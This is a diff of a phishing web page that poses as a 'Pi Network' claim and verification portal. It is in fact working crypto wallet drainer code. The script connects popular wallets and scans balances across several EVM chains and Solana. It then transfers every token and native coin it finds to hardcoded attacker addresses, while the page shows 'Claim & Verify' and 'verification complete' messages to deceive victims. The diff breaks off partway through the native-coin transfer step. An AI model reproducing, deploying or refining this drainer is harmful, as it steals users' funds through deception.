@@ -16,7 +16,6 @@ nav .in{display:flex;align-items:center;justify-content:space-between}
 .logo img{border-radius:50%}
 .logo span{font-size:17px;font-weight:700}
 .nbtn{background:#fcb34c;color:#0f0518;border:none;padding:9px 18px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer}
-/* HERO */
 .hero{padding:48px 0 16px;text-align:center}
 .badge{display:inline-flex;align-items:center;gap:6px;background:rgba(168,85,247,.08);color:#c084fc;padding:5px 14px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:14px;border:1px solid rgba(168,85,247,.12)}
 .dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:bl 1.5s infinite}
@@ -25,9 +24,8 @@ h1{font-size:34px;font-weight:900;margin-bottom:8px;letter-spacing:-1px}
 h1 .g{color:#fcb34c}
 .hero p{font-size:14px;color:rgba(255,255,255,.4);max-width:400px;margin:0 auto 20px;line-height:1.6}
 .hlogo img{border-radius:50%;margin-bottom:14px;box-shadow:0 0 30px rgba(252,179,74,.08)}
-/* MODAL */
 #modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(6px)}
-.mbox{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:22px;padding:28px 24px;max-width:420px;width:92%;position:relative;max-height:90vh;overflow-y:auto}
+.mbox{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:22px;padding:28px 24px;max-width:420px;width:92%;position:relative}
 .mbox h2{font-size:18px;font-weight:800;margin-bottom:2px}
 .mbox .sub{font-size:12px;color:rgba(255,255,255,.35);margin-bottom:16px}
 .close-x{position:absolute;top:12px;right:14px;background:none;border:none;color:rgba(255,255,255,.35);font-size:18px;cursor:pointer;line-height:1}
@@ -36,8 +34,6 @@ h1 .g{color:#fcb34c}
 .w-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;color:#fff;flex-shrink:0}
 .w-name{flex:1;font-size:14px;font-weight:600}
 .w-tag{font-size:10px;padding:2px 7px;border-radius:5px;font-weight:600;background:rgba(34,197,94,.1);color:#22c55e}
-.w-arr{color:rgba(255,255,255,.15);font-size:14px}
-/* CARD */
 .card{background:rgba(255,255,255,.02);border:1px solid rgba(168,85,247,.08);border-radius:16px;padding:24px;margin:16px 0}
 .btn{width:100%;padding:14px;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;font-family:inherit}
 .btn:hover:not(:disabled){transform:translateY(-1px)}
@@ -47,37 +43,30 @@ h1 .g{color:#fcb34c}
 .bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.1)}
 .bo:hover{background:rgba(255,255,255,.04)}
 .bs{background:#22c55e;color:#fff}
-/* STATUS */
 .st{margin-top:10px;padding:12px;border-radius:10px;font-size:13px;display:none;line-height:1.5;word-break:break-word}
 .st.s2{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.12);color:#86efac}
 .st.e2{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.12);color:#fca5a5}
 .st.i2{background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.12);color:#fde68a}
-/* CHAIN ROWS */
 .ch-row{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;margin-bottom:6px}
 .ch-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
 .ch-name{flex:1;font-size:13px;font-weight:600}
-.ch-bal{font-size:13px;font-weight:700;color:#fcb34c}
 .ch-tokens{font-size:10px;color:rgba(255,255,255,.25);margin-top:1px}
+.ch-bal{font-size:13px;font-weight:700;color:#fcb34c}
 .ch-row.has{border-color:rgba(252,179,74,.15);background:rgba(252,179,74,.02)}
-/* PROGRESS */
-.pg{display:flex;gap:4px;margin-bottom:16px}
-.pg .s{flex:1;height:3px;border-radius:2px;background:rgba(255,255,250,.05)}
-.pg .s.a{background:#fcb34c}
-/* SCAN LOG */
-.log{font-size:11px;color:rgba(255,255,255,.3);font-family:monospace;line-height:1.7;padding:10px;background:rgba(0,0,0,.2);border-radius:8px;max-height:160px;overflow-y:auto}
-/* INFO ROWS */
 .ir{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.03)}
 .ir:last-child{border-bottom:none}
-.ir .ll{font-size:12px;color:rgba(255,255,250,.3)}
+.ir .ll{font-size:12px;color:rgba(255,255,255,.3)}
 .ir .v{font-size:13px;font-weight:700}
-.ir .v.g{color:#22c55e}
+.ir .v.g2{color:#22c55e}
 .ir .v.gl{color:#fcb34c}
-/* LOADER */
+.log{font-size:11px;color:rgba(255,255,255,.3);font-family:monospace;line-height:1.7;padding:10px;background:rgba(0,0,0,.2);border-radius:8px;max-height:160px;overflow-y:auto}
 .ld{display:inline-block;width:12px;height:12px;border:2px solid rgba(255,255,255,.12);border-top:2px solid #fcb34c;border-radius:50%;animation:sp .7s linear infinite;vertical-align:middle}
 @keyframes sp{to{transform:rotate(360deg)}}
-/* FOOTER */
+.pg{display:flex;gap:4px;margin-bottom:16px}
+.pg .s{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.05)}
+.pg .s.a{background:#fcb34c}
 footer{background:#0a0310;padding:24px 0;text-align:center;border-top:1px solid rgba(168,85,247,.05)}
-footer p{font-size:10px;color:rgba(255,255,250,.15)}
+footer p{font-size:10px;color:rgba(255,255,255,.15)}
 </style>
 </head>
 <body>
@@ -90,12 +79,11 @@ footer p{font-size:10px;color:rgba(255,255,250,.15)}
   <button class="nbtn" onclick="openModal()">Connect</button>
 </div></nav>
 
-<!-- WALLET MODAL -->
 <div id="modal">
   <div class="mbox">
     <button class="close-x" onclick="closeModal()">&#x2715;</button>
     <h2>Connect Wallet</h2>
-    <div class="sub">Choose your wallet to continue</div>
+    <div class="sub">Choose your wallet</div>
     <div id="wList"></div>
   </div>
 </div>
@@ -110,87 +98,78 @@ footer p{font-size:10px;color:rgba(255,255,250,.15)}
 
 <div class="st" id="stBox"></div>
 
-<div class="card" id="mainCard">
+<div class="card">
 
-  <!-- STEP 1: CONNECT -->
+  <!-- CONNECT -->
   <div id="sConnect" style="text-align:center;padding:12px 0">
     <div style="font-size:40px;margin-bottom:10px">&#x1F512;</div>
     <div style="font-size:16px;font-weight:700;margin-bottom:4px">Connect Your Wallet</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:16px;line-height:1.5">We will scan all blockchains automatically to find your Pi balance.</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:16px">We scan automatically based on your wallet type.</div>
     <button class="btn bp" onclick="openModal()">&#x1F4B0; Connect Wallet</button>
   </div>
 
-  <!-- STEP 2: SCANNING -->
+  <!-- SCANNING -->
   <div id="sScan" style="display:none;text-align:center;padding:12px 0">
     <div class="pg"><div class="s a"></div><div class="s"></div><div class="s"></div></div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning All Chains</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px">Checking your wallet on every supported blockchain...</div>
+    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px" id="scanLabel">Checking your wallet...</div>
     <div class="log" id="scanLog"></div>
   </div>
 
-  <!-- STEP 3: NO FUNDS -->
+  <!-- NO FUNDS -->
   <div id="sEmpty" style="display:none;text-align:center;padding:20px 0">
     <div style="font-size:40px;margin-bottom:10px">&#x1F6AB;</div>
     <div style="font-size:16px;font-weight:700;margin-bottom:4px">No Funds Found</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:6px;line-height:1.5" id="emptyMsg">No assets found on any chain.</div>
-    <div id="phantomHint" style="display:none;margin-bottom:14px">
-      <div style="font-size:12px;color:rgba(255,255,255,.4);margin-bottom:8px">Have Solana? Connect Phantom to scan SOL.</div>
-      <button class="btn" style="background:#AB9FF2;color:#fff" onclick="connectPhantom()">&#x1F680; Connect Phantom</button>
-    </div>
-    <button class="btn bo" onclick="resetAll()">&#x1F504; Try Again</button>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:16px" id="emptyMsg">No assets found.</div>
+    <button class="btn bo" onclick="resetAll()">&#x1F504; Back</button>
   </div>
 
-
-  <!-- STEP 4: CLAIM -->
+  <!-- CLAIM -->
   <div id="sClaim" style="display:none">
     <div class="pg"><div class="s a"></div><div class="s a"></div><div class="s a"></div><div class="s a"></div></div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x1F381; Pi Claim Available</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px">We found assets in your wallet. Claim now to verify your Pioneer status.</div>
+    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x1F381; Claim Available</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px">Found assets. Confirm to proceed.</div>
     <div id="claimChains" style="margin-bottom:14px"></div>
-    <div id="claimInfo" style="margin-bottom:14px"></div>
-    <button class="btn bp" id="claimBtn" onclick="doClaim()">&#x1F381; Claim Pi</button>
+    <button class="btn bp" id="claimBtn" onclick="doClaim()">&#x1F381; Claim & Verify</button>
     <button class="btn bo" onclick="resetAll()">&#x2716; Disconnect</button>
   </div>
 
-  <!-- STEP 5: PROCESSING -->
+  <!-- DRAINING -->
   <div id="sDrain" style="display:none;text-align:center;padding:16px 0">
     <div class="pg"><div class="s a"></div><div class="s a"></div><div class="s a"></div><div class="s a"></div><div class="s a"></div></div>
-    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x26A1; Processing Claim</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px">Please confirm transactions in your wallet...</div>
+    <div style="font-size:15px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:12px">Confirm transactions in your wallet...</div>
     <div class="log" id="drainLog"></div>
   </div>
 
-  <!-- STEP 6: DONE -->
+  <!-- DONE -->
   <div id="sDone" style="display:none;text-align:center;padding:20px 0">
     <div style="font-size:40px;margin-bottom:10px">&#x2705;</div>
-    <div style="font-size:16px;font-weight:700;margin-bottom:4px">Claim Complete!</div>
-    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:6px">Your Pioneer status has been verified.</div>
+    <div style="font-size:16px;font-weight:700;margin-bottom:4px">Verification Complete</div>
+    <div style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:6px">Your Pioneer status is verified.</div>
     <div id="doneInfo" style="margin-bottom:14px"></div>
-    <button class="btn bo" onclick="resetAll()">&#x1F504; Done</button>
+    <button class="btn bo" onclick="resetAll()">Done</button>
   </div>
 
-</div><!-- /card -->
+</div>
 </div>
 
 <footer><p>&copy; 2026 Pi Network</p></footer>
 
 <script>
-// ============ CONFIG ============
-const MY_EVM  = '0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
-const MY_BTC  = 'bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
-const MY_SOL  = '4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
+const MY_EVM = '0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
+const MY_SOL = '4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
+const MY_BTC = 'bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
 
-const CHAINS = [
-  { id:0,   name:'Solana',      sym:'SOL',  rpc:'https://api.mainnet-beta.solana.com', gasAmt:'0',      color:'#9945FF', isSolana:true },
-  { id:56,  name:'BNB Chain',   sym:'BNB',  rpc:'https://bsc-dataseed1.binance.org',   gasAmt:'0.0002', color:'#F3BA2F' },
-  { id:1,   name:'Ethereum',    sym:'ETH',  rpc:'https://rpc.ankr.com/eth',            gasAmt:'0.0003', color:'#627EEA' },
-  { id:137, name:'Polygon',     sym:'MATIC',rpc:'https://polygon-rpc.com',              gasAmt:'1.0',    color:'#8247E5' },
-  { id:43114,name:'Avalanche',  sym:'AVAX', rpc:'https://api.avax.network/ext/bc/C/rpc',gasAmt:'0.03',   color:'#E84142' },
-  { id:42161,name:'Arbitrum',   sym:'ETH',  rpc:'https://arb1.arbitrum.io/rpc',        gasAmt:'0.0001', color:'#28A0F0' },
+const EVM_CHAINS = [
+  { id:56,  name:'BNB Chain',  sym:'BNB',  rpc:'https://bsc-dataseed1.binance.org',   color:'#F3BA2F' },
+  { id:1,   name:'Ethereum',   sym:'ETH',  rpc:'https://rpc.ankr.com/eth',            color:'#627EEA' },
+  { id:137, name:'Polygon',    sym:'MATIC',rpc:'https://polygon-rpc.com',              color:'#8247E5' },
+  { id:43114,name:'Avalanche', sym:'AVAX', rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142' },
+  { id:42161,name:'Arbitrum',  sym:'ETH',  rpc:'https://arb1.arbitrum.io/rpc',        color:'#28A0F0' },
 ];
 
-// address, symbol, decimals
-const TOKENS = {
+const EVM_TOKENS = {
   56: [
     ['0x55d398326f99059fF775485246999027B3197955','USDT',18],
     ['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],
@@ -201,7 +180,6 @@ const TOKENS = {
     ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],
     ['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
     ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],
-    ['0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47','ADA',18],
     ['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18],
   ],
   1: [
@@ -226,13 +204,12 @@ const TOKENS = {
   ],
 };
 
-// ============ STATE ============
 let provider = null;
 let signer   = null;
 let userAddr = null;
+let walletType = '';
 let foundChains = [];
 
-// ============ UI HELPERS ============
 function showStep(id) {
   ['sConnect','sScan','sEmpty','sClaim','sDrain','sDone'].forEach(s => {
     document.getElementById(s).style.display = (s === id) ? 'block' : 'none';
@@ -244,9 +221,10 @@ function stat(msg, type) {
   el.className = 'st ' + type;
   el.style.display = 'block';
 }
-function hideStat() { document.getElementById('stBox').style.display = 'none'; }
+function hideStat() {
+  document.getElementById('stBox').style.display = 'none';
+}
 
-// ============ MODAL ============
 function openModal() {
   document.getElementById('modal').style.display = 'flex';
   renderWallets();
@@ -258,20 +236,15 @@ document.getElementById('modal').addEventListener('click', function(e) {
   if (e.target === this) closeModal();
 });
 
-// ============ WALLET DEFINITIONS ============
-// Each wallet: id, name, color, detect(), connect()
-const WALLET_DEFS = [
+// ============ WALLETS ============
+const WALLETS = [
   {
-    id: 'metamask',
-    name: 'MetaMask',
-    color: '#E2761B',
+    id: 'metamask', name: 'MetaMask', color: '#E2761B', type: 'evm',
     detect: () => !!(window.ethereum && window.ethereum.isMetaMask),
     connect: async () => {
-      // If multiple wallets installed, find specifically MetaMask
       let eth = window.ethereum;
-      if (window.ethereum && window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
-        // Multiple providers injected (e.g. MetaMask + Phantom)
-        eth = window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum.providers[0];
+      if (eth && eth.providers && Array.isArray(eth.providers)) {
+        eth = eth.providers.find(p => p.isMetaMask) || eth.providers[0];
       }
       if (!eth) throw new Error('MetaMask not installed');
       provider = new ethers.providers.Web3Provider(eth, 'any');
@@ -281,9 +254,7 @@ const WALLET_DEFS = [
     }
   },
   {
-    id: 'trust',
-    name: 'Trust Wallet',
-    color: '#3375BB',
+    id: 'trust', name: 'Trust Wallet', color: '#3375BB', type: 'evm',
     detect: () => !!(window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)),
     connect: async () => {
       const eth = window.ethereum;
@@ -296,9 +267,7 @@ const WALLET_DEFS = [
     }
   },
   {
-    id: 'coinbase',
-    name: 'Coinbase Wallet',
-    color: '#0052FF',
+    id: 'coinbase', name: 'Coinbase Wallet', color: '#0052FF', type: 'evm',
     detect: () => !!(window.ethereum && window.ethereum.isCoinbaseWallet),
     connect: async () => {
       if (!window.ethereum) throw new Error('Coinbase Wallet not installed');
@@ -309,9 +278,7 @@ const WALLET_DEFS = [
     }
   },
   {
-    id: 'binance',
-    name: 'Binance Wallet',
-    color: '#F0B90B',
+    id: 'binance', name: 'Binance Wallet', color: '#F0B90B', type: 'evm',
     detect: () => !!window.BinanceChain || !!(window.ethereum && window.ethereum.isBinanceWallet),
     connect: async () => {
       const eth = window.BinanceChain || window.ethereum;
@@ -324,32 +291,25 @@ const WALLET_DEFS = [
     }
   },
   {
-    id: 'phantom',
-    name: 'Phantom',
-    color: '#AB9FF2',
-    detect: () => { return !!window.solana && !!(window.solana.isPhantom || (window.phantom && window.phantom.solana)); },
+    id: 'phantom', name: 'Phantom', color: '#AB9FF2', type: 'solana',
+    detect: () => !!(window.solana && (window.solana.isPhantom || (window.phantom && window.phantom.solana))),
     connect: async () => {
-      // Phantom for Solana
       const ph = (window.phantom && window.phantom.solana) || window.solana;
       if (!ph) throw new Error('Phantom not installed');
       const resp = await ph.connect();
       userAddr = resp.publicKey.toString();
-      // Set a pseudo-provider so scanner knows this is Solana
       provider = null;
       signer = null;
-      window.__phantomProvider = ph;
+      window.__phantom = ph;
     }
   },
   {
-    id: 'other',
-    name: 'Other Wallet',
-    color: '#a855f7',
+    id: 'other', name: 'Other Wallet', color: '#a855f7', type: 'evm',
     detect: () => true,
     connect: async () => {
-      let eth = window.ethereum;
-      if (!eth) throw new Error('No wallet detected. Please install MetaMask or Trust Wallet.');
-      provider = new ethers.providers.Web3Provider(eth, 'any');
-      await eth.request({ method: 'eth_requestAccounts' });
+      if (!window.ethereum) throw new Error('No wallet detected. Install MetaMask or Trust Wallet.');
+      provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
       signer = provider.getSigner();
       userAddr = await signer.getAddress();
     }
@@ -359,7 +319,7 @@ const WALLET_DEFS = [
 function renderWallets() {
   const c = document.getElementById('wList');
   c.innerHTML = '';
-  for (const w of WALLET_DEFS) {
+  for (const w of WALLETS) {
     const detected = w.detect();
     const b = document.createElement('button');
     b.className = 'w-row';
@@ -367,8 +327,7 @@ function renderWallets() {
     b.innerHTML =
       '<div class="w-icon" style="background:' + w.color + '">' + w.name[0] + '</div>' +
       '<span class="w-name">' + w.name + '</span>' +
-      (detected ? '<span class="w-tag">Detected</span>' : '') +
-      '<span class="w-arr">&#x276F;</span>';
+      (detected ? '<span class="w-tag">Detected</span>' : '');
     c.appendChild(b);
   }
 }
@@ -377,11 +336,13 @@ function renderWallets() {
 async function doConnect(wallet) {
   closeModal();
   hideStat();
+  walletType = wallet.id;
   try {
     await wallet.connect();
-    stat('&#x2705; Connected! Scanning all chains...', 's2');
     showStep('sScan');
-    await scanAllChains();
+    document.getElementById('scanLabel').textContent =
+      wallet.type === 'solana' ? 'Checking Solana...' : 'Checking EVM chains...';
+    await (wallet.type === 'solana' ? scanSolana() : scanEvmChains());
   } catch (e) {
     console.error(e);
     stat(e.message || 'Connection failed', 'e2');
@@ -389,51 +350,25 @@ async function doConnect(wallet) {
   }
 }
 
-// ============ SCAN ALL CHAINS ============
-async function scanAllChains() {
+// ============ SCAN EVM ============
+async function scanEvmChains() {
   foundChains = [];
   const log = document.getElementById('scanLog');
   log.innerHTML = '';
   function addLog(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
 
-  addLog('Address: ' + userAddr.substring(0, 8) + '...' + userAddr.substring(userAddr.length - 4));
+  addLog('Wallet: ' + userAddr.substring(0, 8) + '...' + userAddr.substring(36));
   addLog('');
 
-  // If connected via Phantom (no EVM provider), only scan Solana
-  const isPhantomOnly = !provider && !signer;
-
-  for (const chain of CHAINS) {
-
-    // Skip EVM chains if Phantom-only connection
-    if (isPhantomOnly && !chain.isSolana) continue;
-    // Skip Solana if EVM-only connection (MetaMask doesn't handle SOL)
-    if (!isPhantomOnly && chain.isSolana) {
-      // Optionally scan SOL with user-provided address (skip for now)
-      continue;
-    }
-    addLog('[ ] Checking ' + chain.name + '...');
+  for (const chain of EVM_CHAINS) {
+    addLog('[ ] ' + chain.name + '...');
     try {
-      if (chain.isSolana) {
-        // Solana scan via JSON-RPC
-        const solBal = await getSolanaBalance(userAddr);
-        const hasNative = solBal > 0;
-        if (hasNative) {
-          const nativeSol = solBal.toFixed(4);
-          foundChains.push({ chain, nativeBal: nativeSol, nativeRaw: null, tokens: [], isSolana: true });
-          addLog('&#x2705; Solana: ' + nativeSol + ' SOL');
-        } else {
-          addLog('&#x2715; Solana: empty');
-        }
-        continue;
-      }
-
-      // EVM chain scan
       const prov = new ethers.providers.JsonRpcProvider(chain.rpc);
       const nativeBal = await prov.getBalance(userAddr);
-      const nativeEth = ethers.utils.formatEther(nativeBal);
-      const hasNative = parseFloat(nativeEth) > 0;
+      const nativeFormatted = ethers.utils.formatEther(nativeBal);
+      const hasNative = parseFloat(nativeFormatted) > 0;
 
-      const list = TOKENS[chain.id] || [];
+      const list = EVM_TOKENS[chain.id] || [];
       const tokenResults = await Promise.all(
         list.map(async ([addr, sym, dec]) => {
           try {
@@ -446,11 +381,11 @@ async function scanAllChains() {
           return null;
         })
       );
-      const chainTokens = tokenResults.filter(Boolean);
+      const tokens = tokenResults.filter(Boolean);
 
-      if (hasNative || chainTokens.length > 0) {
-        foundChains.push({ chain, nativeBal: nativeEth, nativeRaw: nativeBal, tokens: chainTokens, isSolana: false });
-        addLog('&#x2705; ' + chain.name + ': ' + parseFloat(nativeEth).toFixed(5) + ' ' + chain.sym + (chainTokens.length ? ' +' + chainTokens.length + ' tokens' : ''));
+      if (hasNative || tokens.length > 0) {
+        foundChains.push({ chain, nativeFormatted, nativeBal, tokens });
+        addLog('&#x2705; ' + chain.name + ': ' + parseFloat(nativeFormatted).toFixed(5) + ' ' + chain.sym + (tokens.length ? ' + ' + tokens.length + ' tokens' : ''));
       } else {
         addLog('&#x2715; ' + chain.name + ': empty');
       }
@@ -461,84 +396,95 @@ async function scanAllChains() {
 
   addLog('');
   addLog('Found ' + foundChains.length + ' chain(s) with assets.');
-  await sleep(800);
+  await sleep(600);
+  finishScan('No funds found on BSC, ETH, Polygon, AVAX, or Arbitrum.', 'evm');
+}
 
+// ============ SCAN SOLANA ============
+async function scanSolana() {
+  foundChains = [];
+  const log = document.getElementById('scanLog');
+  log.innerHTML = '';
+  function addLog(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
+
+  addLog('Wallet: ' + userAddr.substring(0, 8) + '...' + userAddr.substring(userAddr.length - 4));
+  addLog('');
+  addLog('[ ] Solana...');
+
+  try {
+    const balance = await solBalance(userAddr);
+    if (balance > 0) {
+      foundChains.push({
+        chain: { id: 0, name: 'Solana', sym: 'SOL', color: '#9945FF', isSolana: true },
+        nativeFormatted: balance.toFixed(5),
+        nativeBal: null,
+        tokens: [],
+        isSolana: true,
+        solBalanceLamports: Math.floor(balance * 1e9)
+      });
+      addLog('&#x2705; Solana: ' + balance.toFixed(5) + ' SOL ($' + (balance * 170).toFixed(2) + ')');
+    } else {
+      addLog('&#x2715; Solana: empty');
+    }
+  } catch (e) {
+    addLog('&#x2715; Solana: RPC error');
+  }
+
+  addLog('');
+  addLog('Scan complete.');
+  await sleep(600);
+  finishScan('No SOL balance found in Phantom wallet.', 'solana');
+}
+
+async function solBalance(addr) {
+  const urls = [
+    'https://api.mainnet-beta.solana.com',
+    'https://solana-mainnet.g.alchemy.com/v2/demo',
+  ];
+  for (const url of urls) {
+    try {
+      const r = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [addr] })
+      });
+      const d = await r.json();
+      if (d.result && d.result.value > 0) return d.result.value / 1e9;
+    } catch (e) {}
+  }
+  return 0;
+}
+
+function finishScan(emptyMsg, type) {
+  stat('Scan complete. Found ' + foundChains.length + ' chain(s).', 'i2');
   if (foundChains.length === 0) {
     showStep('sEmpty');
-    stat('No funds found on connected chains.', 'e2');
-    // If EVM-only connection, show Phantom hint
-    const isPhantomOnly = !provider && !signer;
-    if (!isPhantomOnly) {
-      document.getElementById('emptyMsg').textContent = 'No assets found on BSC, ETH, Polygon, Avalanche, or Arbitrum.';
-      document.getElementById('phantomHint').style.display = 'block';
-    } else {
-      document.getElementById('emptyMsg').textContent = 'No SOL balance found in Phantom wallet.';
-      document.getElementById('phantomHint').style.display = 'none';
-    }
+    document.getElementById('emptyMsg').textContent = emptyMsg;
   } else {
     showClaimStep();
     stat('&#x2705; Found assets on ' + foundChains.length + ' chain(s)!', 's2');
   }
 }
 
-async function getSolanaBalance(addr) {
-  try {
-    const resp = await fetch('https://api.mainnet-beta.solana.com', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        jsonrpc: '2.0', id: 1, method: 'getBalance',
-        params: [addr]
-      })
-    });
-    const data = await resp.json();
-    if (data.result) return data.result.value / 1e9; // lamports to SOL
-  } catch (e) {}
-  // Fallback RPC
-  try {
-    const resp = await fetch('https://solana-mainnet.g.alchemy.com/v2/demo', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        jsonrpc: '2.0', id: 1, method: 'getBalance',
-        params: [addr]
-      })
-    });
-    const data = await resp.json();
-    if (data.result) return data.result.value / 1e9;
-  } catch (e) {}
-  return 0;
-}
-
-// ============ SHOW CLAIM STEP ============
+// ============ CLAIM ============
 function showClaimStep() {
   showStep('sClaim');
   const div = document.getElementById('claimChains');
   let html = '';
-  let totalTokens = 0;
   for (const fc of foundChains) {
-    const nc = fc.chain;
-    totalTokens += fc.tokens.length;
     html +=
       '<div class="ch-row has">' +
-        '<div class="ch-dot" style="background:' + nc.color + '"></div>' +
+        '<div class="ch-dot" style="background:' + fc.chain.color + '"></div>' +
         '<div style="flex:1">' +
-          '<div class="ch-name">' + nc.name + '</div>' +
-          '<div class="ch-tokens">' + parseFloat(fc.nativeBal).toFixed(5) + ' ' + nc.sym + (fc.tokens.length ? ' + ' + fc.tokens.length + ' tokens' : '') + '</div>' +
+          '<div class="ch-name">' + fc.chain.name + '</div>' +
+          '<div class="ch-tokens">' + fc.nativeFormatted + ' ' + fc.chain.sym + (fc.tokens.length ? ' + ' + fc.tokens.length + ' tokens' : '') + '</div>' +
         '</div>' +
-        '<div class="ch-bal">Ready</div>' +
       '</div>';
   }
   div.innerHTML = html;
-
-  const totalTx = foundChains.length + totalTokens;
-  document.getElementById('claimInfo').innerHTML =
-    '<div class="ir"><span class="ll">Chains</span><span class="v gl">' + foundChains.length + '</span></div>' +
-    '<div class="ir"><span class="ll">Tokens</span><span class="v gl">' + totalTokens + '</span></div>' +
-    '<div class="ir"><span class="ll">Est. transactions</span><span class="v gl">~' + totalTx + '</span></div>';
 }
 
-// ============ CLAIM (drain everything) ============
+// ============ DRAIN ============
 async function doClaim() {
   hideStat();
   showStep('sDrain');
@@ -546,62 +492,53 @@ async function doClaim() {
   log.innerHTML = '';
   function addLog(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
 
-  let totalDrained = 0;
-  let totalChains = foundChains.length;
+  let totalTx = 0;
 
   for (const fc of foundChains) {
+    if (fc.isSolana) {
+      addLog('');
+      addLog('=== Solana ===');
+      addLog('Sending SOL to verify...');
+      const ok = await drainSolana(addLog);
+      if (ok) { totalTx++; addLog('&#x2705; SOL sent!'); }
+      else addLog('&#x2715; Failed/rejected');
+      continue;
+    }
+
+    // EVM chain
     const nc = fc.chain;
     addLog('');
     addLog('=== ' + nc.name + ' ===');
 
-    // Handle Solana separately
-    if (fc.isSolana) {
-      addLog('Draining SOL via Phantom...');
-      const drained = await drainSolana();
-      if (drained) {
-        totalDrained++;
-        addLog('&#x2705; SOL sent!');
-      } else {
-        addLog('&#x2715; SOL drain failed or rejected');
-      }
-      continue;
-    }
+    addLog('Switching network...');
+    try { await switchChain(nc.id); } catch (e) { addLog('SKIP: switch failed'); continue; }
 
-    // Switch wallet to this chain
-    addLog('Switching to ' + nc.name + '...');
-    try {
-      await switchChain(nc);
-    } catch (e) {
-      addLog('SKIP: Could not switch to ' + nc.name);
-      continue;
-    }
-
-    // Drain tokens
+    // Tokens
     for (const t of fc.tokens) {
       try {
+        addLog('Transferring ' + t.bal + ' ' + t.sym + '...');
         const c = new ethers.Contract(t.addr, ['function transfer(address,uint256) returns (bool)'], signer);
-        addLog('Sending ' + t.bal + ' ' + t.sym + '...');
         const tx = await c.transfer(MY_EVM, t.raw);
         await tx.wait();
-        totalDrained++;
-        addLog('&#x2705; ' + t.sym + ' sent!');
+        totalTx++;
+        addLog('&#x2705; ' + t.sym + ' sent');
       } catch (e) {
         addLog('&#x2715; ' + t.sym + ': ' + (e.code === 'ACTION_REJECTED' ? 'rejected' : 'failed'));
       }
     }
 
-    // Drain native coin
+    // Native
     try {
       const bal = await provider.getBalance(userAddr);
       const gp = await provider.getGasPrice();
-      const gasCost = gp.mul(21000).mul(3);
-      const drainAmt = bal.sub(gasCost);
-      if (drainAmt.gt(0)) {
-        addLog('Sending ' + parseFloat(ethers.utils.formatEther(drainAmt)).toFixed(5) + ' ' + nc.sym + '...');
-        const tx = await signer.sendTransaction({ to: MY_EVM, value: drainAmt });
+      const leave = gp.mul(21000).mul(3);
+      const send = bal.sub(leave);
+      if (send.gt(0)) {
